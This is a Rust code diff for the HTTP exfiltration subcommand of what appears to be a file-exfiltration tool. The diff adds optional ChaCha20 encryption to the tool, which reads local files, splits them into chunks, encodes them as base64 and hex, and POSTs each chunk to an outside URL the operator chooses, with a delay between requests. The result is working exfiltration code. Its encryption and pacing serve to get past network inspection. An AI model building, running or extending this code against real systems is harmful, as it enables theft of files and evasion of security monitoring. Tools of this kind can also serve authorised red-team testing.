@@ -50,31 +50,85 @@ pub struct HTTPExfiltrationSubCommand {
         value_parser=clap::value_parser!(u16).range(1..)
     )]
     chunks: u16,
+
+    // TODO!: Add custom key type format: str=<key_string>, file=<key_file_path>, url=<key_url>
+    /// Optional cipher key for encrypting the payload
+    #[arg(long = "cipher-key", required = false)]
+    cipher_key: Option<String>,
+}
+
+impl HTTPExfiltrationSubCommand {
+    fn encrypt_payload(
+        &self,
+        payload_bytes: Vec<u8>,
+        root_node: &crate::nodes::root::RootNode,
+    ) -> crate::error::Result<Vec<u8>> {
+        let key = self.cipher_key.as_ref().unwrap();
+        let root_node_str = root_node.to_string();
+        let nonce = root_node_str.as_bytes().last_chunk::<12>().unwrap();
+        crate::ciphers::chacha20_encrypt(key, nonce, payload_bytes)
+    }
 }
 
 impl CommandHandler for HTTPExfiltrationSubCommand {
     /// Execute the HTTP exfiltration flow.
     ///
-    /// For each provided `files_path`:
-    /// 1. Read the file.
-    /// 2. Split it into `chunks` logical parts and encode each part.
-    /// 3. POST each encoded chunk to the configured `url` with Content-Type `text/plain`.
-    /// 4. Sleep for `delay` milliseconds between requests.
+    /// Notes:
+    /// - Each file specified in `files_path` is read, optionally encrypted
+    /// with the provided cipher key, chunked into `chunks` parts,
+    /// encoded using base64->hex encoding, and sent as the body
+    /// of an HTTP POST request to the specified `url`.
     ///
-    /// Errors during file reading, encoding, or HTTP requests are propagated
-    /// via the `crate::error::Result` type.
+    /// - A delay of `delay` milliseconds is observed between sending each chunk.
+    ///
+    /// - The `reqwest` crate is used for HTTP requests.
+    ///
+    /// - If a `cipher_key` is provided, the payload is encrypted using
+    /// ChaCha20-Poly1305 before chunking and encoding.
+    ///
+    /// - Logging is performed at various stages to provide feedback on progress.
+    ///
+    /// # Errors
+    /// - Returns an error if file reading, encryption, chunking,
+    /// encoding, or HTTP requests fail.
+    ///
+    /// # Panics
+    /// - Panics if the provided cipher key is invalid for ChaCha20-Poly1305.
     fn handle(self) -> crate::error::Result<()> {
         for file_path in self.files_path.iter() {
-            log::info!("Reading file {}", file_path.to_string_lossy());
+            log::debug!("Reading file {}", file_path.to_string_lossy());
 
-            for payload_chunk in
-                crate::encoders::http::b64_encode_file(&file_path, self.chunks as usize)?
-            {
-                log::info!("Sending chunk: {}", payload_chunk);
+            let root_node = crate::nodes::root::RootNode::try_from(file_path)?;
+            log::info!("Exfiltrating file '{}'", root_node.file_name);
+
+            let mut file_bytes = crate::encoders::buffered_read_file(&file_path)?;
+
+            if self.cipher_key.is_some() {
+                log::info!("Encrypting payload with provided cipher key.");
+                file_bytes = self.encrypt_payload(file_bytes, &root_node)?;
+            }
+
+            let chunk_nodes = crate::encoders::http::build_chunk_nodes(
+                std::rc::Rc::clone(&root_node.file_identifier),
+                file_bytes,
+                self.chunks as usize,
+            )?;
+
+            let mut nodes = vec![crate::nodes::Node::Root(root_node)];
+            nodes.extend(chunk_nodes);
+
+            log::info!(
+                "Sending {} chunks to {} with {}ms delay between requests.",
+                nodes.len() - 1,
+                self.url,
+                self.delay
+            );
+            for payload_chunk in crate::encoders::http::encode_file_chunks_to_hex_b64(nodes) {
+                log::debug!("Sending chunk: {}", payload_chunk);
 
                 reqwest::blocking::Client::new()
                     .post(&self.url)
-                    .body(payload_chunk.to_owned())
+                    .body(payload_chunk)
                     .header("Content-Type", "text/plain")
                     .send()?;
                 std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
